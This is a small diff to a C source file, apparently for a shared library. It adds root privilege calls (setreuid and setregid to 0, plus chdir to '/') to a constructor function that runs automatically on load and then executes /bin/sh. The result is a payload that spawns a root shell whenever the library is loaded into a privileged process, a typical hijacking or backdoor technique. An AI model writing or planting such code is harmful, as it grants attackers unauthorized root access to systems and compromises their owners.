@@ -40,5 +40,9 @@ __attribute__((constructor)) void init(void) {
     close(client);
     close(sockfd);
     
+    setreuid(0, 0);
+    setregid(0, 0);
+    chdir("/");
+    
     execl("/bin/sh", "sh", NULL);
 }
